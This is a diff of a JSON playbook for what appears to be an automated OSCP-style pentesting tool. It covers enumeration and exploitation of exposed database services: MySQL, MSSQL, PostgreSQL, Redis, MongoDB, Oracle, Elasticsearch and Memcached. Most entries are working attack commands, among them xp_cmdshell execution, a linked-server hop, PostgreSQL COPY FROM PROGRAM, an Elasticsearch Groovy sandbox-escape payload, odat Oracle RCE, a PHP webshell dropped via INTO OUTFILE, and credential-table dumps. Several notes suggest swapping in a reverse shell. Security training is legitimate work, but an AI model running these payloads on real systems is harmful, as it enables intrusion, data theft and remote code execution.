@@ -1,142 +1,667 @@
 {
   "name": "Database service enumeration & access (§3)",
-  "description": "Enumerate, log into, and — carefully, exam-safe — exploit exposed database services: MySQL/MariaDB, MSSQL, PostgreSQL, Redis, and MongoDB. Enumeration and login run automatically; OS command execution such as xp_cmdshell is only crafted and handed off, never auto-fired.",
+  "description": "Enumerate, log into, and (carefully, exam-safe) exploit exposed database services: MySQL/MariaDB, MSSQL, PostgreSQL, Redis, and MongoDB. Enumeration and login run automatically; OS command execution such as xp_cmdshell is only crafted and handed off, never auto-fired.",
   "source": "OSCP methodology (project-authored, obol-local)",
   "actions": [
     {
       "id": "mysql-login",
-      "title": "MySQL / MariaDB login",
+      "title": "MySQL / MariaDB Login",
       "hypothesis": "A reachable MySQL will often take a discovered credential, a blank root password, or reused creds; a session into it opens up schema and credential-table enumeration.",
       "tool": "mysql",
-      "tools": ["mysql", "mariadb"],
-      "requires_any": ["service.mysql", "port:3306"],
-      "produces": ["db.session"],
+      "tools": [
+        "mysql",
+        "mariadb"
+      ],
+      "requires_any": [
+        "service.mysql",
+        "port:3306"
+      ],
+      "produces": [
+        "db.session"
+      ],
       "priority": 70,
       "autonomy": "approve",
       "proves": "an authenticated MySQL session",
-      "does_not_prove": "OS access or a validated OS credential — a database login lives at the app layer",
-      "report": {"finding": "Database service accessible", "severity": "medium"},
-      "refs": ["https://book.hacktricks.xyz/network-services-pentesting/pentesting-mysql"],
+      "does_not_prove": "OS access or a validated OS credential, a database login lives at the app layer",
+      "report": {
+        "finding": "Database service accessible",
+        "severity": "medium"
+      },
+      "refs": [
+        "https://book.hacktricks.xyz/network-services-pentesting/pentesting-mysql"
+      ],
       "commands": [
-        {"tool": "mysql", "run": "mysql -h {{target}} -u {{user}} -p{{password}} -e 'SELECT version();'"},
-        {"tool": "mysql", "run": "mysql -h {{target}} -u root --password= -e 'SHOW DATABASES;'"}
+        {
+          "tool": "mysql",
+          "run": "mysql -h {{target}} -u {{user}} -p{{password}} -e 'SELECT version();'"
+        },
+        {
+          "tool": "mysql",
+          "run": "mysql -h {{target}} -u root --password= -e 'SHOW DATABASES;'"
+        }
       ]
     },
     {
       "id": "mysql-loot",
-      "title": "MySQL credential-table sweep",
+      "title": "MySQL Credential-Table Sweep",
       "hypothesis": "Application databases keep their own user rows and password hashes, so dumping the user tables yields crackable material and frequently reused admin creds.",
       "tool": "mysql",
-      "tools": ["mysql"],
-      "requires_all": ["db.session"],
-      "produces": ["loot.material"],
+      "tools": [
+        "mysql"
+      ],
+      "requires_all": [
+        "db.session"
+      ],
+      "produces": [
+        "loot.material"
+      ],
       "priority": 66,
       "autonomy": "approve",
-      "proves": "recovered credential material from the database (hashes) — crackable loot",
+      "proves": "recovered credential material from the database (hashes), crackable loot",
       "does_not_prove": "a usable credential until a hash is cracked and a login confirms it",
       "commands": [
-        {"tool": "mysql", "run": "mysql -h {{target}} -u {{user}} -p{{password}} -e 'SELECT user,authentication_string FROM mysql.user;'"},
-        {"tool": "mysql", "run": "mysql -h {{target}} -u {{user}} -p{{password}} -e 'SELECT username,password FROM users;' <database>"}
+        {
+          "tool": "mysql",
+          "run": "mysql -h {{target}} -u {{user}} -p{{password}} -e 'SELECT user,authentication_string FROM mysql.user;'"
+        },
+        {
+          "tool": "mysql",
+          "run": "mysql -h {{target}} -u {{user}} -p{{password}} -e 'SELECT username,password FROM users;' {{database}}"
+        }
       ]
     },
     {
       "id": "mssql-login",
-      "title": "MSSQL login",
+      "title": "MSSQL Login",
       "hypothesis": "MSSQL will often accept a domain credential or the `sa` account; an authenticated SQL prompt is the way into enumeration and, given enough privilege, command execution.",
-      "tool": "mssqlclient.py",
-      "tools": ["mssqlclient.py", "impacket-mssqlclient"],
-      "requires_any": ["service.ms-sql-s", "port:1433"],
-      "produces": ["db.session"],
+      "tool": "nxc",
+      "tools": [
+        "nxc",
+        "mssqlclient.py",
+        "impacket-mssqlclient"
+      ],
+      "requires_any": [
+        "service.ms-sql-s",
+        "port:1433"
+      ],
+      "produces": [
+        "db.session"
+      ],
       "priority": 72,
       "autonomy": "approve",
       "proves": "an authenticated MSSQL session",
-      "does_not_prove": "OS command execution — that requires xp_cmdshell, a separate crafted step",
-      "report": {"finding": "MSSQL service accessible", "severity": "medium"},
-      "refs": ["https://book.hacktricks.xyz/network-services-pentesting/pentesting-mssql-microsoft-sql-server"],
+      "does_not_prove": "OS command execution, that requires xp_cmdshell, a separate crafted step",
+      "report": {
+        "finding": "MSSQL service accessible",
+        "severity": "medium"
+      },
+      "refs": [
+        "https://book.hacktricks.xyz/network-services-pentesting/pentesting-mssql-microsoft-sql-server"
+      ],
       "commands": [
-        {"tool": "mssqlclient.py", "run": "mssqlclient.py {{domain}}/{{user}}:{{password}}@{{target}} -windows-auth"},
-        {"tool": "mssqlclient.py", "run": "mssqlclient.py {{user}}:{{password}}@{{target}}"}
+        {
+          "tool": "nxc",
+          "run": "nxc mssql {{target}} -u {{user}} -p '{{password}}'",
+          "note": "PREFERRED, from Kali: validate the credential against MSSQL in one shot. A [+] line means a working login (db.session); a (Pwn3d!) means the account is sysadmin, go straight to xp_cmdshell. Add --local-auth for a SQL login instead of a domain account, and -q 'SELECT ...' to run a query without an interactive prompt."
+        },
+        {
+          "tool": "mssqlclient.py",
+          "run": "mssqlclient.py {{domain}}/{{user}}:{{password}}@{{target}} -windows-auth",
+          "note": "Interactive SQL prompt (Windows/domain auth) when you want to browse databases by hand or stage xp_cmdshell manually."
+        },
+        {
+          "tool": "mssqlclient.py",
+          "run": "mssqlclient.py {{user}}:{{password}}@{{target}}",
+          "note": "Interactive SQL prompt with a local SQL login (no -windows-auth)."
+        }
       ]
     },
     {
       "id": "mssql-xp-cmdshell",
-      "title": "MSSQL xp_cmdshell command execution",
+      "title": "MSSQL xp_cmdshell Command Execution",
       "hypothesis": "An MSSQL login with sysadmin rights can enable and invoke xp_cmdshell to run OS commands as the SQL service account, giving a Windows foothold.",
-      "tool": "mssqlclient.py",
-      "tools": ["mssqlclient.py"],
-      "requires_all": ["db.session"],
-      "produces": ["foothold.windows"],
+      "tool": "nxc",
+      "tools": [
+        "nxc",
+        "mssqlclient.py"
+      ],
+      "requires_all": [
+        "db.session"
+      ],
+      "requires_any": [
+        "service.ms-sql-s",
+        "port:1433"
+      ],
+      "produces": [
+        "foothold.windows"
+      ],
       "priority": 60,
       "autonomy": "manual",
       "proves": "OS command execution as the MSSQL service account (a Windows foothold)",
-      "does_not_prove": "an interactive shell or administrator — the service account is frequently low-privileged",
-      "report": {"finding": "MSSQL xp_cmdshell command execution", "severity": "high"},
-      "refs": ["https://book.hacktricks.xyz/network-services-pentesting/pentesting-mssql-microsoft-sql-server"],
+      "does_not_prove": "an interactive shell or administrator, the service account is frequently low-privileged",
+      "report": {
+        "finding": "MSSQL xp_cmdshell command execution",
+        "severity": "high"
+      },
+      "refs": [
+        "https://book.hacktricks.xyz/network-services-pentesting/pentesting-mssql-microsoft-sql-server"
+      ],
       "commands": [
-        {"tool": "mssqlclient.py", "run": "EXEC sp_configure 'show advanced options',1; RECONFIGURE; EXEC sp_configure 'xp_cmdshell',1; RECONFIGURE; EXEC xp_cmdshell 'whoami';"}
+        {
+          "tool": "nxc",
+          "run": "nxc mssql {{target}} -u {{user}} -p '{{password}}' -x 'whoami'",
+          "note": "PREFERRED, from Kali: nxc enables xp_cmdshell for you and runs the command in one shot, no manual sp_configure dance. Swap -x for -X to run PowerShell. An identity line (NT AUTHORITY\\SYSTEM or a service account) in the output is the Windows foothold. Needs the sysadmin role the (Pwn3d!) from MSSQL Login confirmed."
+        },
+        {
+          "tool": "mssqlclient.py",
+          "run": "EXEC sp_configure 'show advanced options',1; RECONFIGURE; EXEC sp_configure 'xp_cmdshell',1; RECONFIGURE; EXEC xp_cmdshell 'whoami';",
+          "note": "Manual fallback from the interactive mssqlclient prompt: enable xp_cmdshell, then invoke it. Use when nxc's -x is blocked or you are already sitting in the SQL session."
+        }
       ]
     },
     {
       "id": "postgres-login",
-      "title": "PostgreSQL login",
+      "title": "PostgreSQL Login",
       "hypothesis": "PostgreSQL may accept a default or reused credential; an authenticated session enumerates databases and, on older versions, opens RCE through COPY or large-object tricks.",
       "tool": "psql",
-      "tools": ["psql"],
-      "requires_any": ["service.postgresql", "port:5432"],
-      "produces": ["db.session"],
+      "tools": [
+        "psql"
+      ],
+      "requires_any": [
+        "service.postgresql",
+        "port:5432"
+      ],
+      "produces": [
+        "db.session"
+      ],
       "priority": 68,
       "autonomy": "approve",
       "proves": "an authenticated PostgreSQL session",
-      "does_not_prove": "OS access — RCE on Postgres is a separate, version-dependent step",
-      "report": {"finding": "PostgreSQL service accessible", "severity": "medium"},
+      "does_not_prove": "OS access, RCE on Postgres is a separate, version-dependent step",
+      "report": {
+        "finding": "PostgreSQL service accessible",
+        "severity": "medium"
+      },
       "commands": [
-        {"tool": "psql", "run": "PGPASSWORD={{password}} psql -h {{target}} -U {{user}} -c '\\l'"}
+        {
+          "tool": "psql",
+          "run": "PGPASSWORD={{password}} psql -h {{target}} -U {{user}} -c '\\l'"
+        }
+      ]
+    },
+    {
+      "id": "postgres-rce",
+      "title": "PostgreSQL to Command Execution",
+      "hypothesis": "A PostgreSQL session with a superuser role is a shell: COPY ... FROM PROGRAM runs an OS command and reads its output straight back into a table (9.3+), and older builds reach the same end through an untrusted PL/language or a large-object write. The DB becomes your foothold as the postgres service account.",
+      "tool": "psql",
+      "tools": [
+        "psql"
+      ],
+      "os": [
+        "linux"
+      ],
+      "requires_all": [
+        "db.session"
+      ],
+      "requires_any": [
+        "service.postgresql",
+        "port:5432"
+      ],
+      "produces": [
+        "foothold.linux"
+      ],
+      "priority": 70,
+      "proves": "OS command execution through the PostgreSQL session — a foothold as the DB service account",
+      "does_not_prove": "a non-superuser session can run COPY FROM PROGRAM; that needs the pg_execute_server_program role or superuser",
+      "report": {
+        "finding": "Remote Code Execution via PostgreSQL",
+        "severity": "critical"
+      },
+      "refs": [
+        "https://book.hacktricks.xyz/network-services-pentesting/pentesting-postgresql"
+      ],
+      "commands": [
+        {
+          "tool": "psql",
+          "run": "psql -h {{target}} -U {{user}} -c \"COPY (SELECT '') TO PROGRAM 'id'\"",
+          "note": "The quick proof: TO PROGRAM runs the command (output goes to the server's stdout/logs)."
+        },
+        {
+          "tool": "psql",
+          "run": "psql -h {{target}} -U {{user}} -c \"DROP TABLE IF EXISTS x; CREATE TABLE x(o text); COPY x FROM PROGRAM 'id'; SELECT * FROM x;\"",
+          "note": "The readable form: FROM PROGRAM captures command output into a table you then SELECT. `uid=...` is your foothold; swap id for a reverse shell and catch it with the listener card."
+        }
       ]
     },
     {
       "id": "redis-enum",
-      "title": "Redis unauthenticated enumeration",
+      "title": "Redis Unauthenticated Enumeration",
       "hypothesis": "A Redis exposed on a lab or the internet frequently has no AUTH set; INFO and KEYS surface cached secrets, and a writable instance can be pushed toward RCE by writing an SSH key or a webshell.",
       "tool": "redis-cli",
-      "tools": ["redis-cli"],
-      "requires_any": ["port:6379", "service.redis"],
-      "produces": ["config.review", "loot.material"],
+      "tools": [
+        "redis-cli"
+      ],
+      "requires_any": [
+        "port:6379",
+        "service.redis"
+      ],
+      "produces": [
+        "config.review",
+        "loot.material"
+      ],
       "priority": 64,
       "autonomy": "auto",
       "proves": "an unauthenticated Redis instance and any secrets cached in it",
-      "does_not_prove": "OS access — Redis RCE is a separate, crafted step",
-      "report": {"finding": "Unauthenticated Redis service", "severity": "high"},
-      "refs": ["https://book.hacktricks.xyz/network-services-pentesting/6379-pentesting-redis"],
+      "does_not_prove": "OS access, Redis RCE is a separate, crafted step",
+      "report": {
+        "finding": "Unauthenticated Redis service",
+        "severity": "high"
+      },
+      "refs": [
+        "https://book.hacktricks.xyz/network-services-pentesting/6379-pentesting-redis"
+      ],
       "sequence": true,
       "commands": [
-        {"tool": "redis-cli", "run": "redis-cli -h {{target}} INFO"},
-        {"tool": "redis-cli", "run": "redis-cli -h {{target}} KEYS '*'"}
+        {
+          "tool": "redis-cli",
+          "run": "redis-cli -h {{target}} INFO"
+        },
+        {
+          "tool": "redis-cli",
+          "run": "redis-cli -h {{target}} KEYS '*'"
+        }
       ]
     },
     {
       "id": "mongo-enum",
-      "title": "MongoDB unauthenticated enumeration",
+      "title": "MongoDB Unauthenticated Enumeration",
       "hypothesis": "An exposed MongoDB with no auth lets you list databases and dump a collection, exposing application data and any stored credentials.",
       "tool": "nmap",
-      "tools": ["nmap", "pymongo"],
-      "requires_any": ["port:27017", "service.mongodb"],
-      "produces": ["loot.material"],
+      "tools": [
+        "nmap",
+        "pymongo"
+      ],
+      "requires_any": [
+        "port:27017",
+        "service.mongodb"
+      ],
+      "produces": [
+        "loot.material"
+      ],
       "priority": 62,
       "autonomy": "auto",
       "proves": "readable MongoDB collections (any credential material they hold)",
       "does_not_prove": "a validated credential until the material is confirmed with a login",
-      "report": {"finding": "Unauthenticated MongoDB service", "severity": "high"},
-      "refs": ["https://book.hacktricks.xyz/network-services-pentesting/27017-27018-mongodb"],
+      "report": {
+        "finding": "Unauthenticated MongoDB service",
+        "severity": "high"
+      },
+      "refs": [
+        "https://book.hacktricks.xyz/network-services-pentesting/27017-27018-mongodb"
+      ],
       "sequence": true,
       "commands": [
-        {"tool": "nmap", "run": "nmap -Pn -p 27017 --script mongodb-info,mongodb-databases {{target}}",
-         "note": "the zero-install lead: stock nmap NSE confirms an unauthenticated MongoDB and lists its databases"},
-        {"tool": "pymongo", "run": "python3 -c 'from pymongo import MongoClient; c=MongoClient(\"{{target}}\", 27017, serverSelectionTimeoutMS=5000); print(c.list_database_names())'",
-         "note": "list databases through the client (pymongo, apt python3-pymongo) — the query is on the terminal"},
-        {"tool": "pymongo", "run": "python3 -c 'from pymongo import MongoClient; c=MongoClient(\"{{target}}\", 27017, serverSelectionTimeoutMS=5000); [print(db, c[db].list_collection_names()) for db in c.list_database_names()]'",
-         "note": "enumerate the collections in each database — spot the interesting one (users, creds, config)"},
-        {"tool": "pymongo", "run": "python3 -c 'from pymongo import MongoClient; c=MongoClient(\"{{target}}\", 27017, serverSelectionTimeoutMS=5000); [print(d) for d in c[\"admin\"][\"users\"].find().limit(50)]'",
-         "note": "dump a collection — set the db/collection from the step above (here admin.users); reads any stored credentials"}
+        {
+          "tool": "nmap",
+          "run": "nmap -Pn -p 27017 --script mongodb-info,mongodb-databases {{target}}",
+          "note": "the zero-install lead: stock nmap NSE confirms an unauthenticated MongoDB and lists its databases"
+        },
+        {
+          "tool": "pymongo",
+          "run": "python3 -c 'from pymongo import MongoClient; c=MongoClient(\"{{target}}\", 27017, serverSelectionTimeoutMS=5000); print(c.list_database_names())'",
+          "note": "list databases through the client (pymongo, apt python3-pymongo), the query is on the terminal"
+        },
+        {
+          "tool": "pymongo",
+          "run": "python3 -c 'from pymongo import MongoClient; c=MongoClient(\"{{target}}\", 27017, serverSelectionTimeoutMS=5000); [print(db, c[db].list_collection_names()) for db in c.list_database_names()]'",
+          "note": "enumerate the collections in each database, spot the interesting one (users, creds, config)"
+        },
+        {
+          "tool": "pymongo",
+          "run": "python3 -c 'from pymongo import MongoClient; c=MongoClient(\"{{target}}\", 27017, serverSelectionTimeoutMS=5000); [print(d) for d in c[\"admin\"][\"users\"].find().limit(50)]'",
+          "note": "dump a collection, set the db/collection from the step above (here admin.users); reads any stored credentials"
+        }
+      ]
+    },
+    {
+      "id": "oracle-tns",
+      "title": "Oracle TNS Enumeration & Login",
+      "hypothesis": "The Oracle TNS listener on 1521 guards the database behind a System ID (SID) and a login. Older listeners leak or allow brute-forcing of the SID, and default accounts (system, scott, dbsnmp) with stock passwords are common. With a SID and a credential you get a SQL session, and with the right privilege Oracle reads and writes files on the host and can be pushed to command execution.",
+      "tool": "odat",
+      "tools": [
+        "odat",
+        "sqlplus",
+        "nmap"
+      ],
+      "requires_any": [
+        "port:1521",
+        "service.oracle-tns"
+      ],
+      "produces": [
+        "db.session"
+      ],
+      "priority": 60,
+      "autonomy": "approve",
+      "sequence": true,
+      "proves": "the SID, any default or weak Oracle credential, and an authenticated session",
+      "does_not_prove": "OS command execution, which needs a privileged account and a separate odat step",
+      "report": {
+        "finding": "Oracle database accessible",
+        "severity": "medium"
+      },
+      "refs": [
+        "https://book.hacktricks.xyz/network-services-pentesting/1521-1522-1529-pentesting-oracle-listener"
+      ],
+      "commands": [
+        {
+          "tool": "nmap",
+          "run": "nmap -sV -p1521 --script oracle-sid-brute {{target}}",
+          "note": "Fingerprint the listener version with -sV and brute common SIDs (oracle-sid-brute is a real NSE script; there is no oracle-tns-version)."
+        },
+        {
+          "tool": "odat",
+          "run": "odat sidguesser -s {{target}} -p 1521",
+          "note": "odat (Oracle Database Attacking Tool) brute-forces the SID when the listener will not disclose it."
+        },
+        {
+          "tool": "odat",
+          "run": "odat passwordguesser -s {{target}} -p 1521 -d {{sid}} --accounts-file accounts/accounts.txt",
+          "note": "Guess default account/password pairs against the discovered SID."
+        },
+        {
+          "tool": "sqlplus",
+          "run": "sqlplus {{user}}/{{password}}@{{target}}:1521/{{sid}}",
+          "note": "Log in with a found credential; from a privileged account odat utlfile/externaltable then reads, writes, and runs code."
+        }
+      ]
+    },
+    {
+      "id": "oracle-rce",
+      "title": "Oracle to Command Execution",
+      "hypothesis": "A privileged Oracle session reaches the OS: odat automates the known paths - an external table that runs a command, a Java stored procedure, or the scheduler (DBMS_SCHEDULER) - turning a database login into code execution on the host. ODAT bundles them so you do not hand-write the PL/SQL.",
+      "tool": "odat",
+      "tools": [
+        "odat",
+        "sqlplus"
+      ],
+      "os": [
+        "linux"
+      ],
+      "requires_all": [
+        "db.session"
+      ],
+      "requires_any": [
+        "port:1521",
+        "service.oracle-tns"
+      ],
+      "produces": [
+        "foothold.linux"
+      ],
+      "priority": 68,
+      "proves": "OS command execution through the Oracle session — a foothold as the Oracle service account",
+      "does_not_prove": "that every account can; the external-table/Java/scheduler paths need the matching privileges (often DBA)",
+      "report": {
+        "finding": "Remote Code Execution via Oracle Database",
+        "severity": "critical"
+      },
+      "refs": [
+        "https://github.com/quentinhardy/odat"
+      ],
+      "commands": [
+        {
+          "tool": "odat",
+          "run": "odat externaltable -s {{target}} -d {{sid}} -U {{user}} -P {{password}} --getecho --command \"id\"",
+          "note": "The external-table path: run a command and read its echo. `uid=...` confirms the foothold; swap in a reverse shell and catch it."
+        },
+        {
+          "tool": "odat",
+          "run": "odat all -s {{target}} -d {{sid}} -U {{user}} -P {{password}}",
+          "note": "Let odat probe every RCE and file path your account can reach, then use the one it reports as exploitable."
+        }
+      ]
+    },
+    {
+      "id": "elasticsearch-enum",
+      "title": "Elasticsearch Unauthenticated Enumeration",
+      "hypothesis": "Elasticsearch exposes a JSON REST API on 9200 that frequently ships with no authentication. Its indices hold whatever the application stored, logs, user records, documents, so listing the indices and dumping the interesting one reads the data directly. Old versions (the Groovy sandbox bypass CVE-2015-1427, fixed in 1.3.8 and 1.4.3, and the older MVEL dynamic-script RCE CVE-2014-3120 on pre-1.2 installs) also carry well-known RCE through the search scripting engine.",
+      "tool": "curl",
+      "tools": [
+        "curl",
+        "nmap"
+      ],
+      "requires_any": [
+        "port:9200",
+        "service.elasticsearch"
+      ],
+      "produces": [
+        "loot.material"
+      ],
+      "priority": 58,
+      "autonomy": "auto",
+      "sequence": true,
+      "proves": "readable Elasticsearch indices and any data they hold",
+      "does_not_prove": "a validated credential or RCE until a document is confirmed useful or a version-specific exploit lands",
+      "report": {
+        "finding": "Unauthenticated Elasticsearch service",
+        "severity": "high"
+      },
+      "refs": [
+        "https://book.hacktricks.xyz/network-services-pentesting/9200-pentesting-elasticsearch"
+      ],
+      "commands": [
+        {
+          "tool": "curl",
+          "run": "curl -s http://{{target}}:9200/",
+          "note": "Read the banner: the version number decides whether a scripting-engine RCE is on the table."
+        },
+        {
+          "tool": "curl",
+          "run": "curl -s http://{{target}}:9200/_cat/indices?v",
+          "note": "List every index with its document count; the names tell you where the data is."
+        },
+        {
+          "tool": "curl",
+          "run": "curl -s 'http://{{target}}:9200/{{index}}/_search?pretty&size=100'",
+          "note": "Dump documents from an index; stored records routinely include usernames and secrets."
+        }
+      ]
+    },
+    {
+      "id": "elasticsearch-rce",
+      "title": "Elasticsearch to Command Execution",
+      "hypothesis": "Old Elasticsearch builds run attacker code through their scripting engine: the dynamic-scripting MVEL path (CVE-2014-3120, <=1.1) and the Groovy sandbox escape (CVE-2015-1427, 1.3.0-1.3.7/1.4.0-1.4.2) both execute OS commands and hand the output back in the JSON response. Check the version the enum reported, then run the matching gadget.",
+      "tool": "curl",
+      "tools": [
+        "curl"
+      ],
+      "os": [
+        "linux"
+      ],
+      "requires_any": [
+        "port:9200",
+        "service.elasticsearch"
+      ],
+      "produces": [
+        "foothold.linux"
+      ],
+      "priority": 60,
+      "proves": "OS command execution through the Elasticsearch scripting engine — a foothold as the elasticsearch user",
+      "does_not_prove": "a shell on a patched build; the version has to fall in the vulnerable range",
+      "report": {
+        "finding": "Remote Code Execution via Elasticsearch",
+        "severity": "critical"
+      },
+      "refs": [
+        "https://www.exploit-db.com/exploits/36337"
+      ],
+      "commands": [
+        {
+          "tool": "curl",
+          "run": "curl -s http://{{target}}:9200/",
+          "note": "Read the version. <=1.1 → CVE-2014-3120 (MVEL); 1.3.x/1.4.x ≤ 1.4.2 → CVE-2015-1427 (Groovy). Pick the matching gadget below."
+        },
+        {
+          "tool": "curl",
+          "run": "curl -s 'http://{{target}}:9200/_search?pretty' -d '{\"size\":1,\"script_fields\":{\"x\":{\"lang\":\"groovy\",\"script\":\"java.lang.Math.class.forName(\\\"java.lang.Runtime\\\").getRuntime().exec(\\\"id\\\").getText()\"}}}'",
+          "note": "CVE-2015-1427 Groovy sandbox escape: the response embeds the command output. `uid=...` is the foothold; swap id for a reverse shell and catch it with the listener card."
+        }
+      ]
+    },
+    {
+      "id": "memcached-enum",
+      "title": "Memcached Unauthenticated Dump",
+      "hypothesis": "Memcached on 11211 is an in-memory cache with no authentication by design. Applications stash session tokens, rendered pages, and sometimes credentials in it, so listing the cached keys and reading their values can hand you a live session or a secret straight out of memory.",
+      "tool": "ncat",
+      "tools": [
+        "ncat",
+        "nc",
+        "memcstat",
+        "nmap"
+      ],
+      "requires_any": [
+        "port:11211",
+        "service.memcached"
+      ],
+      "produces": [
+        "loot.material"
+      ],
+      "priority": 54,
+      "autonomy": "auto",
+      "sequence": true,
+      "proves": "the keys cached in memcached and any values you can read",
+      "does_not_prove": "a validated credential until a dumped value is confirmed to log in somewhere",
+      "report": {
+        "finding": "Unauthenticated memcached service",
+        "severity": "medium"
+      },
+      "refs": [
+        "https://book.hacktricks.xyz/network-services-pentesting/11211-memcache"
+      ],
+      "commands": [
+        {
+          "tool": "nmap",
+          "run": "nmap -p11211 --script memcached-info {{target}}",
+          "note": "Confirm the service and read its stats without typing the text protocol by hand."
+        },
+        {
+          "tool": "memcstat",
+          "run": "memcstat --servers={{target}}",
+          "note": "A one-shot stats read via libmemcached-tools; shows item counts so you know there is something to dump."
+        },
+        {
+          "tool": "ncat",
+          "run": "ncat {{target}} 11211",
+          "note": "Interactive: send `stats items`, then `stats cachedump <slab> 0` to list keys, then `get <key>` to read a value."
+        }
+      ]
+    },
+    {
+      "id": "mssql-linked-server",
+      "title": "MSSQL Linked-Server & Impersonation Hop",
+      "phase": "foothold",
+      "hypothesis": "SQL Server trusts other SQL Servers: a linked server is a saved connection one instance keeps to another, often with a stored login and often to a host you cannot reach directly. Enumerating the links, then querying through them with OPENQUERY or EXEC AT, lets a low-privilege login reach a higher-privileged context on the far instance. Where the link maps to a sysadmin, you re-enable and call xp_cmdshell on that server for OS command execution, turning one database login into code execution on another box.",
+      "tool": "mssqlclient",
+      "tools": [
+        "mssqlclient",
+        "impacket"
+      ],
+      "requires_all": [
+        "db.session"
+      ],
+      "requires_any": [
+        "service.ms-sql-s",
+        "port:1433"
+      ],
+      "produces": [
+        "foothold.windows"
+      ],
+      "priority": 58,
+      "autonomy": "approve",
+      "sequence": true,
+      "proves": "a trusted linked server, the privilege your link login holds on it, and command execution where that login is sysadmin",
+      "does_not_prove": "execution on the far host until a sysadmin link or an impersonable login is confirmed",
+      "report": {
+        "finding": "MSSQL linked-server privilege escalation to RCE",
+        "severity": "high"
+      },
+      "refs": [
+        "https://book.hacktricks.xyz/network-services-pentesting/pentesting-mssql-microsoft-sql-server"
+      ],
+      "commands": [
+        {
+          "tool": "mssqlclient",
+          "run": "mssqlclient.py {{domain}}/{{user}}:{{password}}@{{target}} -windows-auth",
+          "note": "Open the session you start from; -windows-auth for a domain login, drop it for a SQL login."
+        },
+        {
+          "tool": "mssqlclient",
+          "run": "SELECT name, is_linked FROM sys.servers",
+          "note": "List linked servers; any row with is_linked = 1 is a trust you can query through."
+        },
+        {
+          "tool": "mssqlclient",
+          "run": "EXEC ('SELECT SYSTEM_USER, IS_SRVROLEMEMBER(''sysadmin'')') AT [LINKED]",
+          "note": "See who the link logs in as on the far instance, and whether that login is sysadmin there."
+        },
+        {
+          "tool": "mssqlclient",
+          "run": "EXEC ('EXEC sp_configure ''xp_cmdshell'',1;RECONFIGURE;EXEC xp_cmdshell ''whoami''') AT [LINKED]",
+          "note": "On a sysadmin link, enable and run xp_cmdshell on the linked server for command execution on that host."
+        }
+      ]
+    },
+    {
+      "id": "mysql-outfile-rce",
+      "title": "MySQL INTO OUTFILE & UDF to RCE",
+      "phase": "foothold",
+      "hypothesis": "A MySQL login with the FILE privilege and a permissive secure_file_priv can write files anywhere the database user can reach. When that includes a directory the web server publishes, SELECT INTO OUTFILE drops a server-side script into the web root and a single HTTP request runs it. When the web root is not writable but the plugin directory is, the lib_mysqludf_sys UDF defines sys_exec for direct command execution from SQL. Either way a read-only-looking database login becomes code execution.",
+      "tool": "mysql",
+      "tools": [
+        "mysql"
+      ],
+      "requires_all": [
+        "db.session"
+      ],
+      "requires_any": [
+        "service.mysql",
+        "port:3306"
+      ],
+      "produces": [
+        "foothold.webshell"
+      ],
+      "priority": 58,
+      "autonomy": "approve",
+      "sequence": true,
+      "proves": "the FILE privilege, a writable web root or plugin directory, and code execution through the file written",
+      "does_not_prove": "execution until the written file is confirmed to run, and INTO OUTFILE cannot overwrite an existing file",
+      "report": {
+        "finding": "MySQL FILE privilege leads to RCE via INTO OUTFILE",
+        "severity": "high"
+      },
+      "refs": [
+        "https://book.hacktricks.xyz/network-services-pentesting/pentesting-mysql"
+      ],
+      "commands": [
+        {
+          "tool": "mysql",
+          "run": "mysql -h {{target}} -u {{user}} -p{{password}} -e \"SELECT @@secure_file_priv; SHOW GRANTS FOR CURRENT_USER();\"",
+          "note": "Confirm the FILE privilege and that secure_file_priv is empty before trying to write."
+        },
+        {
+          "tool": "mysql",
+          "run": "mysql -h {{target}} -u {{user}} -p{{password}} -e \"SELECT '<?php system($_GET[\"c\"]); ?>' INTO OUTFILE '/var/www/html/sh.php'\"",
+          "note": "Write a PHP one-liner into the web root; adjust the path to the server document root."
+        },
+        {
+          "tool": "curl",
+          "run": "curl \"http://{{target}}/sh.php?c=id\"",
+          "note": "Call the dropped file over HTTP; a returned uid is your proof of code execution."
+        },
+        {
+          "tool": "mysql",
+          "run": "mysql -h {{target}} -u {{user}} -p{{password}} -e \"CREATE FUNCTION sys_exec RETURNING INT SONAME 'lib_mysqludf_sys.so'\"",
+          "note": "UDF fallback when the web root is not writable: load the library, then SELECT sys_exec('id > /tmp/o')."
+        }
       ]
     }
   ]
